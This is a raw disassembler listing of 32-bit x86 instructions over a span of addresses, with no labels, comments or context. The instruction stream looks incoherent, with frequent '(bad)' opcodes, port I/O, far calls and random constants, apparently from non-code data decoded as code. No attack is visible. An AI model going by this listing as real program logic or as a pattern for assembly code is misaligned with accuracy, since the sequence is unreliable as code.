  41d3ac:	cli    
  41d3ad:	or     eax,0x68127dc5
  41d3b2:	fwait
  41d3b3:	cld    
  41d3b4:	mov    ch,0x3b
  41d3b6:	adc    eax,0x49165b92
  41d3bb:	mov    eax,0x320967bc
  41d3c0:	stos   DWORD PTR es:[edi],eax
  41d3c1:	mov    al,ds:0xdb01fa96
  41d3c6:	loopne 0x41d3f6
  41d3c8:	or     eax,DWORD PTR [eax+0x47]
  41d3cb:	ins    DWORD PTR es:[edi],dx
  41d3cc:	cmp    al,0x9f
  41d3ce:	sbb    dh,al
  41d3d0:	popf   
  41d3d1:	pop    es
  41d3d2:	popa   
  41d3d3:	cmp    esp,DWORD PTR [ebx+0x4c]
  41d3d6:	outs   dx,BYTE PTR ds:[esi]
  41d3d7:	nop
  41d3d8:	pop    es
  41d3d9:	xor    ecx,DWORD PTR [ebx+0x17]
  41d3dc:	sub    BYTE PTR [ecx],bl
  41d3de:	pop    edi
  41d3df:	ins    DWORD PTR es:[edi],dx
  41d3e0:	add    DWORD PTR [edi+0x3b],esp
  41d3e3:	and    ah,bl
  41d3e5:	stc    
  41d3e6:	pushf  
  41d3e7:	dec    ebx
  41d3e8:	push   ebp
  41d3e9:	dec    esi
  41d3ea:	sub    BYTE PTR [edi],ch
  41d3ec:	adc    al,0x2c
  41d3ee:	int3   
  41d3ef:	add    BYTE PTR [eax-0x27],dh
  41d3f2:	(bad)  
  41d3f3:	mov    ebp,0x1d6c1633
  41d3f8:	pop    ecx
  41d3f9:	pop    es
  41d3fa:	bound  ebx,QWORD PTR [esi-0x333caa28]
  41d400:	adc    al,0x2d
  41d402:	push   0x63
  41d404:	in     eax,0xb6
  41d406:	stc    
  41d407:	dec    ecx
  41d408:	ret    
  41d409:	mov    ebp,?
  41d40b:	popf   
  41d40c:	mov    eax,ds:0x6dcae9a8
  41d411:	icebp  
  41d412:	inc    esi
  41d413:	rcl    DWORD PTR fs:[ecx],cl
  41d416:	sar    BYTE PTR [ebp+0x22],cl
  41d419:	adc    DWORD PTR [edi+0x2a],esi
  41d41c:	inc    ebx
  41d41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d41e:	push   ds
  41d41f:	out    0x1,al
  41d421:	call   0xafcb:0x6049b788
  41d428:	(bad)  [eax]
  41d42a:	(bad)  
  41d42c:	adc    edx,edi
  41d42e:	mov    edi,0x649b50ab
  41d433:	adc    al,0xfd
  41d435:	in     al,dx
  41d436:	lea    ebx,[ebp+0x25135cd1]
  41d43c:	aaa    
  41d43d:	xchg   ebx,eax
  41d43e:	cmp    al,0x79
  41d440:	and    al,0x2
  41d442:	in     al,0x31
  41d444:	mov    eax,ds:0xad9fe88c
  41d449:	into   
  41d44a:	int    0x59
  41d44c:	rol    ecx,1
  41d44e:	scas   eax,DWORD PTR es:[edi]
  41d44f:	aam    0x17
  41d451:	cmc    
  41d452:	and    esp,DWORD PTR [edi+0x69]
  41d455:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d456:	aam    0x42
  41d458:	adc    al,0x21
  41d45a:	xchg   edi,eax
  41d45b:	pop    es
  41d45c:	pop    edx
  41d45d:	lock mov bl,0xe
  41d460:	std    
  41d461:	push   esp
  41d462:	repnz shl DWORD PTR [ecx],0x5d
  41d466:	pop    edx
  41d467:	mov    eax,esi
  41d469:	popa   
  41d46a:	popf   
  41d46b:	xchg   BYTE PTR [ecx+0x5defb6f6],ch
  41d471:	sub    ch,dh
  41d473:	jecxz  0x41d4e3
  41d475:	(bad)  
  41d476:	jbe    0x41d47d
  41d478:	pop    ebx
  41d479:	add    ah,BYTE PTR [edx+edx*4-0x36]
  41d47d:	jno    0x41d45a
  41d47f:	xchg   esp,eax
  41d480:	jbe    0x41d4a2
  41d482:	jp     0x41d4f7
  41d484:	adc    ebp,esp
  41d486:	and    eax,0x8c19f9e3
  41d48b:	push   cs
  41d48c:	adc    al,0x3c
  41d48e:	xchg   ebp,eax
  41d48f:	int3   
	...
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c4e:0xfe787b89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	imul   esi,DWORD PTR [ebp-0x2a4f1554],0x27d333af
  41d516:	jge    0x41d4b9
  41d518:	mov    edx,0xab5e1404
  41d51d:	push   eax
  41d51e:	fimul  DWORD PTR [ebx]
  41d520:	(bad)  
  41d521:	adc    eax,0x6eb0130b
  41d526:	mov    ah,0x7c
  41d528:	mov    ah,0x99
  41d52a:	sbb    al,0x6d
  41d52c:	mov    eax,0xde79ef6f
  41d531:	mov    BYTE PTR [eax+eax*4-0x65],ch
  41d535:	dec    eax
  41d536:	inc    ecx
  41d537:	aas    
  41d538:	ds into 
  41d53a:	out    0xa3,eax
  41d53c:	sbb    BYTE PTR [eax],ch
  41d53e:	dec    esp
  41d53f:	push   ds
  41d540:	and    esi,DWORD PTR [eax-0x31]
  41d543:	or     eax,0xa034073d
  41d548:	inc    edx
  41d549:	add    al,0x10
  41d54b:	dec    edi
  41d54c:	stos   BYTE PTR es:[edi],al
  41d54d:	dec    eax
  41d54e:	xor    edi,DWORD PTR [ebx-0xe]
  41d551:	inc    ebp
  41d552:	sub    bh,ah
  41d554:	add    DWORD PTR [esi],edx
  41d556:	call   0xc51fafa6
  41d55b:	push   ds
  41d55c:	lods   al,BYTE PTR ds:[esi]
  41d55d:	imul   eax,DWORD PTR [ecx-0x32],0xffffffc8
  41d561:	sbb    al,0xe1
  41d563:	cmp    eax,0xce846ad7
  41d568:	push   edi
  41d569:	xchg   edx,eax
  41d56a:	mov    esp,0x8c788337
  41d56f:	xchg   DWORD PTR [ecx-0x12540cc4],edi
  41d575:	daa    
  41d576:	pop    ebx
  41d577:	rcl    BYTE PTR es:[edi-0x1866b127],1
  41d57e:	enter  0x71c,0x42
  41d582:	cmp    BYTE PTR [edx-0x558bf4fc],dl
  41d588:	stos   BYTE PTR es:[edi],al
  41d589:	fwait
  41d58a:	imul   edi,DWORD PTR [ecx],0xffffff8c
  41d58d:	and    eax,0xd7ebaf1b
  41d592:	pop    ss
  41d593:	dec    ecx
  41d594:	pop    es
  41d595:	ret    0x2d9c
  41d598:	loope  0x41d5e6
  41d59a:	std    
  41d59b:	cli    
  41d59c:	add    BYTE PTR [ebp+0x6e830a0c],al
  41d5a2:	fmul   QWORD PTR [edi]
  41d5a4:	push   ebp
  41d5a5:	addr16 mov bl,0x80
  41d5a8:	sub    DWORD PTR [esi],edx
  41d5aa:	jno    0x41d5b9
  41d5ac:	icebp  
  41d5ad:	fild   DWORD PTR [ebp+edx*1-0x2ec993f8]
  41d5b4:	fild   DWORD PTR [eax-0x392a66c5]
  41d5ba:	mov    fs,edi
  41d5bc:	sub    DWORD PTR [eax],ecx
  41d5be:	test   eax,0xb188e8f7
  41d5c3:	aaa    
  41d5c4:	cld    
  41d5c5:	and    esp,DWORD PTR [esp+eiz*4]
  41d5c8:	fsub   DWORD PTR [edx+0x2e549e9e]
  41d5ce:	les    eax,FWORD PTR [ebx+0x7b]
  41d5d1:	dec    edx
  41d5d2:	popa   
  41d5d3:	dec    ecx
  41d5d4:	mov    edi,0x8b298c4c
  41d5d9:	(bad)  
  41d5da:	push   0x6e
  41d5dc:	push   esp
  41d5dd:	nop
  41d5de:	xor    DWORD PTR [edx-0x2ddcc06e],esi
  41d5e4:	mov    ds:0x416eeee2,eax
  41d5e9:	lahf   
  41d5ea:	or     bh,bl
  41d5ec:	mov    esi,DWORD PTR [edi-0x5448e6f2]
  41d5f2:	jle    0x41d654
  41d5f4:	jo     0x41d5a7
  41d5f6:	rcl    DWORD PTR [eax-0x38],0x66
  41d5fa:	cdq    
  41d5fb:	sub    ah,0x3e
  41d5fe:	dec    edi
  41d5ff:	and    ecx,edi
  41d601:	adc    edx,DWORD PTR [edx+0x21]
  41d604:	dec    ecx
  41d605:	xlat   BYTE PTR ds:[ebx]
  41d606:	in     al,dx
  41d607:	adc    eax,DWORD PTR [eax+0x5d]
  41d60a:	(bad)  
  41d60b:	mov    bh,0x9d
  41d60d:	mov    dh,0x26
  41d60f:	sub    eax,DWORD PTR [eax]
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x7266e435
  41d681:	jbe    0x41d6a9
  41d683:	cmp    DWORD PTR [eax+0x38],esi
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    al,0x1
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	in     al,dx
  41d68d:	dec    eax
  41d68e:	out    0x4f,eax
  41d690:	(bad)  
  41d691:	popa   
  41d692:	loopne 0x41d6ee
  41d694:	das    
  41d695:	je     0x41d686
  41d697:	push   0x43
  41d699:	fbstp  TBYTE PTR [ebx-0x637ac465]
  41d69f:	cmp    DWORD PTR [esi],esp
  41d6a1:	xchg   al,al
  41d6a3:	add    ecx,DWORD PTR [esi+eax*4+0x7d85e238]
  41d6aa:	inc    DWORD PTR [ecx-0x45]
  41d6ad:	sub    ah,bl
  41d6af:	sub    DWORD PTR [esi+0x1c],esi
  41d6b2:	dec    ecx
  41d6b3:	sti    
  41d6b4:	xchg   esp,eax
  41d6b5:	stos   BYTE PTR es:[edi],al
  41d6b6:	add    ebp,esp
  41d6b8:	mov    ebp,DWORD PTR [edi+0x1753fe32]
  41d6be:	xchg   ebp,eax
  41d6bf:	add    BYTE PTR [ecx-0x2e],ah
  41d6c2:	cmp    al,0x3
  41d6c4:	cmp    BYTE PTR [esi],ch
  41d6c6:	std    
  41d6c7:	lahf   
  41d6c8:	mov    ecx,0xc67deb95
  41d6cd:	retf   0xb1c7
  41d6d0:	ins    BYTE PTR es:[edi],dx
  41d6d1:	push   cs
  41d6d2:	repz arpl WORD PTR fs:[edx+0x16df552c],si
  41d6da:	and    ecx,DWORD PTR [edx+eiz*1+0x10]
  41d6de:	jns    0x41d748
  41d6e0:	rcr    ecx,0xd7
  41d6e3:	push   ecx
  41d6e4:	dec    ecx
  41d6e5:	xchg   ebp,eax
  41d6e6:	inc    edi
  41d6e7:	ret    
  41d6e8:	outs   dx,DWORD PTR ds:[esi]
  41d6e9:	mov    ebp,ebp
  41d6eb:	leave  
  41d6ec:	cld    
  41d6ed:	or     DWORD PTR [ebp-0x57],edi
  41d6f0:	outs   dx,BYTE PTR ds:[esi]
  41d6f1:	shl    BYTE PTR [esi+0x4b],0x3d
  41d6f5:	xor    BYTE PTR [edx+0x25],dl
  41d6f8:	(bad)  
  41d6f9:	dec    ecx
  41d6fa:	lock inc edx
  41d6fc:	inc    ecx
  41d6fd:	outs   dx,BYTE PTR ds:[esi]
  41d6fe:	es mov esp,0x9558d919
  41d704:	jo     0x41d71d
  41d706:	ins    BYTE PTR es:[edi],dx
  41d707:	push   ecx
  41d708:	int3   
  41d709:	and    eax,0x40cc650d
  41d70e:	out    dx,al
  41d70f:	mov    esp,0xae909797
  41d714:	(bad)  
  41d715:	das    
  41d716:	lahf   
  41d717:	adc    DWORD PTR [esi],ecx
  41d719:	mov    ds:0x651f6f07,al
  41d71e:	jne    0x41d6f3
  41d720:	lods   al,BYTE PTR ds:[esi]
  41d721:	add    DWORD PTR [ebx],esp
  41d723:	and    dl,ah
  41d725:	cmp    al,ch
  41d727:	jp     0x41d71f
  41d729:	push   0xffffff87
  41d72b:	mov    DWORD PTR [ecx],ebp
  41d72d:	cli    
  41d72e:	add    al,0x8e
  41d730:	cmc    
  41d731:	mov    BYTE PTR [ebx+0x20],al
  41d734:	cs ds mov ch,0x75
  41d738:	mov    bl,0xd8
  41d73a:	scas   al,BYTE PTR es:[edi]
  41d73b:	ficomp WORD PTR [ebx-0x4b]
  41d73e:	jae    0x41d7a2
  41d740:	(bad)  
  41d741:	pop    ecx
  41d742:	lods   al,BYTE PTR ds:[esi]
  41d743:	inc    ecx
  41d744:	or     eax,0xf4f9d6f7
  41d749:	jmp    FWORD PTR [ecx+0x6f]
  41d74c:	ret    
  41d74d:	pop    edx
  41d74e:	test   al,0x42
  41d750:	pop    es
  41d751:	pop    esp
  41d752:	int    0x8
  41d754:	mov    dl,0x65
  41d756:	inc    DWORD PTR [ecx-0x54]
  41d759:	sbb    al,0xe2
  41d75b:	mov    edi,DWORD PTR [edx]
  41d75d:	cmp    ah,BYTE PTR [eax]
  41d75f:	mov    eax,0x598533ed
  41d764:	xchg   esi,eax
  41d765:	les    esp,FWORD PTR [edi+0x46bbee25]
  41d76b:	inc    edx
  41d76c:	xchg   esp,eax
  41d76d:	fmul   QWORD PTR [esi]
  41d76f:	enter  0xdf18,0xd6
  41d773:	jbe    0x41d764
  41d775:	stos   DWORD PTR es:[edi],eax
  41d776:	fist   WORD PTR [ecx]
  41d778:	(bad)  
  41d779:	stos   BYTE PTR es:[edi],al
  41d77a:	sub    DWORD PTR [esi+0x250857b],ecx
  41d780:	fwait
  41d781:	cmp    al,0x26
  41d783:	push   esi
  41d784:	retf   0x45c
  41d787:	add    edi,eax
  41d789:	jg     0x41d771
  41d78b:	or     DWORD PTR [ebx],0xffffff86
  41d78e:	add    al,0xe4
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	mov    DWORD PTR [edx+esi*2+0x139746f],ecx
  41d807:	add    BYTE PTR [ecx+eax*1],al
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	sub    dl,dl
  41d80e:	mov    edi,0x5bd90002
  41d813:	retf   
  41d814:	pop    ecx
  41d815:	sbb    al,0x64
  41d817:	(bad)  
  41d818:	in     al,0x7a
  41d81a:	xchg   edx,eax
  41d81c:	mov    ebp,0x7bb6acd3
  41d821:	scas   al,BYTE PTR es:[edi]
  41d822:	inc    DWORD PTR [esp+ebp*4+0x30]
  41d826:	in     al,dx
  41d827:	and    dl,BYTE PTR [ecx]
  41d829:	in     al,dx
  41d82a:	dec    ebp
  41d82b:	add    ah,ch
  41d82d:	or     ch,BYTE PTR [edi+ecx*8-0x62]
  41d831:	push   edi
  41d832:	lds    ecx,FWORD PTR [esi+0x872bce3]
  41d838:	(bad)  
  41d83a:	xchg   esi,eax
  41d83b:	inc    ecx
  41d83c:	mov    al,ds:0xe9511a52
  41d841:	dec    esi
  41d842:	or     BYTE PTR [eax+eiz*1],0x2a
  41d846:	dec    ebx
  41d847:	out    0x15,al
  41d849:	outs   dx,DWORD PTR ds:[esi]
  41d84a:	mov    al,0x8e
  41d84c:	test   edi,0xc68a64c5
  41d852:	sar    DWORD PTR [ebp-0x35],1
  41d855:	loope  0x41d82a
  41d857:	mov    ebx,DWORD PTR [edi-0x1d]
  41d85a:	ret    
  41d85b:	in     eax,dx
  41d85c:	mov    ah,0xa1
  41d85e:	jmp    0x41d8b7
  41d860:	dec    edx
  41d861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d862:	pop    ecx
  41d863:	stc    
  41d864:	daa    
  41d865:	xchg   esp,eax
  41d866:	ret    0x7777
  41d869:	daa    
  41d86a:	jbe    0x41d8af
  41d86c:	push   edx
  41d86d:	mov    bl,0xe8
  41d86f:	dec    esi
  41d870:	push   0x51ef9358
  41d875:	shl    BYTE PTR [esi+0x6a],cl
  41d878:	adc    eax,0xc67141e2
  41d87d:	loop   0x41d8b4
  41d87f:	sbb    eax,0xa94231d2
  41d884:	pushf  
  41d885:	out    0x69,eax
  41d887:	pusha  
  41d888:	mov    eax,ds:0x9300f151
  41d88d:	jg     0x41d902
  41d88f:	repnz pop eax
  41d891:	mov    DWORD PTR [ecx+0x77],ebp
  41d894:	arpl   WORD PTR [ecx+0x5b0d5632],di
  41d89a:	or     edx,esi
  41d89c:	lds    edx,FWORD PTR [eax-0x6e]
  41d89f:	push   edi
  41d8a0:	mov    ebx,0x4442ae94
  41d8a5:	and    edx,DWORD PTR [ecx]
  41d8a7:	cs xchg ebp,eax
  41d8a9:	mov    ch,0x87
  41d8ab:	loope  0x41d8b6
  41d8ad:	dec    eax
  41d8ae:	fidivr WORD PTR [edi+0x7e]
  41d8b1:	arpl   WORD PTR [ebx+0x13accf9e],si
  41d8b7:	dec    ebp
  41d8b8:	pop    ebp
  41d8b9:	inc    DWORD PTR [edx]
  41d8bb:	pop    eax
  41d8bc:	or     BYTE PTR [ebp-0x1e5f7b0d],dl
  41d8c2:	add    DWORD PTR [edx],edi
  41d8c4:	aaa    
  41d8c5:	addr16 jg 0x41d8e0
  41d8c8:	mov    BYTE PTR [eax],bh
  41d8ca:	xchg   edi,eax
  41d8cb:	inc    edx
  41d8cc:	test   eax,0x9e85f7c
  41d8d1:	sbb    eax,0x6ccf9696
  41d8d6:	cmp    al,0xf0
  41d8d8:	fcmovnu st,st(0)
  41d8da:	aas    
  41d8db:	test   BYTE PTR [ebp+0x229ef7e5],cl
  41d8e1:	sbb    al,0x4c
  41d8e3:	jae    0x41d90b
  41d8e5:	mov    bh,0xd
  41d8e7:	push   0xffffffd0
  41d8e9:	stc    
  41d8ea:	js     0x41d969
  41d8ec:	adc    bl,BYTE PTR [ecx+0x39c0b3f8]
  41d8f2:	cmp    edi,DWORD PTR [ebx-0x6668dcbb]
  41d8f8:	dec    esi
  41d8f9:	jg     0x41d8c0
  41d8fb:	jmp    0x2f9d3541
  41d900:	ss cdq 
  41d902:	loop   0x41d97d
  41d904:	dec    ebx
  41d905:	lahf   
  41d906:	mov    cl,0x57
  41d908:	sbb    ah,BYTE PTR [eax-0x4d]
  41d90b:	das    
  41d90c:	xlat   BYTE PTR ds:[ebx]
  41d90d:	sub    eax,esi
  41d90f:	stos   DWORD PTR es:[edi],eax
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	fisttp QWORD PTR gs:[edx]
  41d982:	or     ah,bl
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	jecxz  0x41d965
  41d98e:	jge    0x41d915
  41d990:	leave  
  41d991:	xchg   ebx,eax
  41d992:	add    cl,BYTE PTR [ebx+0x252ad8e9]
  41d998:	xor    BYTE PTR [edx],dl
  41d99a:	mov    eax,ds:0xf8d0cfbe
  41d99f:	adc    BYTE PTR [edi+ecx*1+0x5e],bh
  41d9a3:	xor    DWORD PTR [ebx+ecx*4+0x356a2f92],0xffffffcb
  41d9ab:	sub    eax,0x9d4d9ce8
  41d9b0:	(bad)  
  41d9b1:	leave  
  41d9b2:	shr    BYTE PTR [ebx+0x1c],cl
  41d9b5:	outs   dx,BYTE PTR ds:[esi]
  41d9b6:	cmp    eax,0xfd412111
  41d9bb:	jno    0x41da07
  41d9bd:	aad    0xb7
  41d9bf:	(bad)  
  41d9c2:	pop    ds
  41d9c3:	mov    al,ds:0x19c7e046
  41d9c8:	cmp    DWORD PTR [edx-0xe0995e3],edi
  41d9ce:	stos   DWORD PTR es:[edi],eax
  41d9cf:	outs   dx,BYTE PTR ds:[esi]
  41d9d0:	xchg   BYTE PTR [edx+eax*8],cl
  41d9d3:	cli    
  41d9d4:	aas    
  41d9d5:	lahf   
  41d9d6:	xor    al,0xe2
  41d9d8:	test   eax,0xbd6322df
  41d9dd:	sub    bh,BYTE PTR [eax-0x6b78dba8]
  41d9e3:	sahf   
  41d9e4:	popa   
  41d9e5:	push   esi
  41d9e6:	xchg   esp,eax
  41d9e7:	test   eax,0xefd885fb
  41d9ec:	jb     0x41d9e4
  41d9ee:	fs (bad) 
  41d9f0:	jb     0x41da1d
  41d9f2:	inc    edi
  41d9f3:	jbe    0x41d9da
  41d9f5:	lea    ebx,[ebx+0x76b416d3]
  41d9fb:	out    0x3,al
  41d9fd:	adc    BYTE PTR [eax],0x15
  41da00:	dec    ebp
  41da01:	ret    
  41da02:	mov    esp,0x9c811200
  41da07:	es mov esi,0x39c98e4e
  41da0d:	idiv   DWORD PTR ds:0x143e07f3
  41da13:	sub    eax,DWORD PTR [ecx+0x20]
  41da16:	adc    BYTE PTR [edx-0x693fda25],al
  41da1c:	cli    
  41da1d:	xor    cl,BYTE PTR [ebx+0x31]
  41da20:	lock js 0x41d9ad
  41da23:	hlt    
  41da24:	dec    eax
  41da25:	jae    0x41da53
  41da27:	adc    ebx,DWORD PTR [ebx+0x5c]
  41da2a:	mov    eax,ds:0xc46f94ea
  41da2f:	mov    dh,0x6
  41da31:	pop    es
  41da32:	or     BYTE PTR [ebx+0x7f],dl
  41da35:	add    al,0xd4
  41da37:	mov    ch,0x7d
  41da39:	mov    ds:0xd4bd9360,al
  41da3e:	push   edi
  41da3f:	into   
  41da40:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da42:	test   eax,0x9100354a
  41da47:	aaa    
  41da48:	xchg   ebp,eax
  41da49:	xchg   ebp,eax
  41da4a:	icebp  
  41da4b:	test   al,0xe
  41da4d:	bound  esp,QWORD PTR [ebx+eax*1+0x26]
  41da51:	mov    edi,0x8fc1fce
  41da56:	pop    ds
  41da57:	sbb    BYTE PTR [edx],dl
  41da59:	test   eax,0xe1a6f7c1
  41da5e:	adc    al,0x48
  41da60:	jg     0x41dac3
  41da62:	scas   eax,DWORD PTR es:[edi]
  41da63:	test   eax,0x348fa1b0
  41da68:	scas   al,BYTE PTR es:[edi]
  41da69:	adc    BYTE PTR [edi],al
  41da6b:	into   
  41da6c:	pop    ss
  41da6d:	mov    eax,ds:0xad36c4cf
  41da72:	xor    dl,bh
  41da74:	ins    BYTE PTR es:[edi],dx
  41da75:	(bad)  
  41da77:	les    edi,FWORD PTR [edi]
  41da79:	xchg   edi,eax
  41da7a:	sub    eax,0x11dc4e52
  41da7f:	jp     0x41dadf
  41da81:	fild   QWORD PTR [eax+0x6d1ef6d1]
  41da87:	pop    ebp
  41da88:	cmp    BYTE PTR [ebp-0x77ddc30b],0x87
  41da8f:	lock add BYTE PTR [eax],al
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x5c
  41db01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db02:	sub    al,cl
  41db04:	jl     0x41db41
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	mov    ah,0x5d
  41db0e:	stos   BYTE PTR es:[edi],al
  41db0f:	pop    ecx
  41db10:	iret   
  41db11:	ja     0x41db3b
  41db13:	dec    edx
  41db14:	xchg   ecx,eax
  41db15:	cwde   
  41db16:	inc    ebp
  41db17:	out    0xda,al
  41db19:	das    
  41db1a:	cmc    
  41db1b:	inc    edx
  41db1c:	xor    dh,BYTE PTR [esi+esi*4-0x3fd25315]
  41db23:	adc    ecx,edx
  41db25:	push   0x2a
  41db27:	fcomp  DWORD PTR [ebp+0x34]
  41db2a:	xchg   cl,dh
  41db2c:	lahf   
  41db2d:	jb     0x41dac3
  41db2f:	adc    al,0xaa
  41db31:	sub    esp,DWORD PTR [ebp+eax*2-0x542cc20b]
  41db38:	or     BYTE PTR [ebx],ch
  41db3a:	neg    al
  41db3c:	psllq  mm4,QWORD PTR [edx-0x3b]
  41db40:	out    dx,eax
  41db41:	call   0x2c4:0x299595d8
  41db48:	push   0x34
  41db4a:	retf   
  41db4b:	ins    BYTE PTR es:[edi],dx
  41db4c:	rcr    DWORD PTR [eax-0x35cc87a1],cl
  41db52:	inc    esi
  41db53:	ss pmullw mm0,mm3
  41db57:	pop    edx
  41db58:	push   0x58
  41db5a:	or     DWORD PTR [ebp+0x4e],0x21
  41db5e:	int    0x41
  41db60:	ss stc 
  41db62:	fcompp 
  41db64:	push   edi
  41db65:	repnz pusha 
  41db67:	mov    WORD PTR ds:[esi+0x6c],ds
  41db6b:	mov    DWORD PTR [ebx],edx
  41db6d:	pop    ds
  41db6e:	in     al,0x6c
  41db70:	in     eax,dx
  41db71:	lock sub esp,esp
  41db74:	dec    eax
  41db75:	mov    al,ds:0x21510779
  41db7a:	es push edi
  41db7c:	adc    eax,0xfccd84a1
  41db81:	pushf  
  41db82:	sub    edi,DWORD PTR [edx+ebx*2]
  41db85:	call   0x8fded422
  41db8a:	mov    BYTE PTR [ebx-0x4d8a90ee],cl
  41db90:	mov    dh,BYTE PTR [edi]
  41db92:	out    dx,al
  41db93:	xchg   edi,eax
  41db94:	ficomp DWORD PTR [ebp-0x7c68bda9]
  41db9a:	outs   dx,DWORD PTR ds:[esi]
  41db9b:	and    DWORD PTR [edi-0x5],edx
  41db9e:	push   es
  41db9f:	mov    edi,0x203be24c
  41dba4:	jns    0x41db72
  41dba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dba7:	mov    ch,0x77
  41dba9:	mov    dl,BYTE PTR [ebp+eiz*8-0x61e89cce]
  41dbb0:	outs   dx,BYTE PTR ds:[esi]
  41dbb1:	mov    esp,0x7718ad21
  41dbb6:	jge    0x41db7c
  41dbb8:	int3   
  41dbb9:	sbb    BYTE PTR [edx],0x31
  41dbbc:	jge    0x41dc03
  41dbbe:	bound  ecx,QWORD PTR [ecx]
  41dbc0:	popa   
  41dbc1:	sahf   
  41dbc2:	push   es
  41dbc3:	sub    eax,0xc8fdf8cc
  41dbc9:	push   eax
  41dbca:	ss push eax
  41dbcc:	ret    0x3254
  41dbcf:	xchg   esi,eax
  41dbd0:	inc    eax
  41dbd1:	ror    DWORD PTR [esp+eiz*8],1
  41dbd4:	push   ds
  41dbd5:	shl    BYTE PTR [edx+eax*8],cl
  41dbd8:	add    ebx,0x6a
  41dbdb:	xchg   ebx,eax
  41dbdc:	pop    eax
  41dbdd:	stos   BYTE PTR es:[edi],al
  41dbde:	lock stc 
  41dbe0:	mov    eax,0xc3e6ae7c
  41dbe5:	dec    esi
  41dbe6:	test   al,0x1a
  41dbe8:	pop    esp
  41dbe9:	cmp    edi,DWORD PTR [ebx-0x70]
  41dbec:	jmp    0xfb562e26
  41dbf1:	popf   
  41dbf2:	xor    al,BYTE PTR [edx-0x40febd1f]
  41dbf8:	cmp    al,0x64
  41dbfa:	push   esp
  41dbfb:	jns    0x41dc35
  41dbfd:	mov    esi,DWORD PTR [esi-0x15]
  41dc00:	and    al,0x2e
  41dc02:	push   ds
  41dc03:	sub    al,BYTE PTR [edx-0xc76c576]
  41dc09:	int3   
  41dc0a:	jp     0x41dbd3
  41dc0c:	push   ebp
  41dc0d:	xor    ch,BYTE PTR gs:[eax+eax*1]
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi-0x154f2fb0]
  41dc81:	cmp    al,0x12
  41dc83:	leave  
  41dc84:	cmp    BYTE PTR [ecx+eax*1],0x0
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	adc    esi,DWORD PTR [eax+ecx*1-0x13e40972]
  41dc93:	push   cs
  41dc94:	int3   
  41dc95:	jae    0x41dd08
  41dc97:	add    esp,esp
  41dc99:	dec    edi
  41dc9a:	das    
  41dc9b:	pop    ecx
  41dc9c:	push   ecx
  41dc9d:	xchg   BYTE PTR [edx-0x10],dh
  41dca0:	or     bh,BYTE PTR [ecx-0x27]
  41dca3:	ds dec edi
  41dca5:	jno    0x41dcee
  41dca7:	add    dh,BYTE PTR [edi+esi*1]
  41dcaa:	push   ss
  41dcab:	inc    eax
  41dcac:	hlt    
  41dcad:	dec    esi
  41dcae:	ret    0xbd97
  41dcb1:	inc    ecx
  41dcb2:	bound  eax,QWORD PTR [edx+0x21]
  41dcb5:	popf   
  41dcb6:	cli    
  41dcb7:	popa   
  41dcb8:	cmp    esi,DWORD PTR [edx-0x3bd4f8c8]
  41dcbe:	jmp    0x41dcd7
  41dcc0:	adc    dl,dl
  41dcc2:	punpcklbw mm4,DWORD PTR [edi-0x3c558a90]
  41dcc9:	push   ebp
  41dcca:	mov    al,0xf2
  41dccc:	lea    edx,[ecx+ebx*8]
  41dccf:	gs jns 0x41dd12
  41dcd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcd3:	retf   0xcddf
  41dcd6:	out    0xe1,al
  41dcd8:	xchg   DWORD PTR [ecx+edx*8+0x59],ecx
  41dcdc:	dec    edi
  41dcdd:	xor    eax,0xb8322cad
  41dce2:	(bad)  
  41dce3:	popf   
  41dce4:	push   0xfffffff6
  41dce6:	stos   BYTE PTR es:[edi],al
  41dce7:	ror    BYTE PTR [esi-0x54],1
  41dcea:	pop    ecx
  41dceb:	iret   
  41dcec:	(bad)  
  41dcee:	push   ecx
  41dcef:	push   ecx
  41dcf0:	icebp  
  41dcf1:	sub    eax,0x90ccf419
  41dcf6:	jg     0x41dd2c
  41dcf8:	out    dx,eax
  41dcf9:	ins    DWORD PTR es:[edi],dx
  41dcfa:	or     ch,BYTE PTR [esi+edi*8-0x39]
  41dcfe:	imul   edx,DWORD PTR [edi],0x1
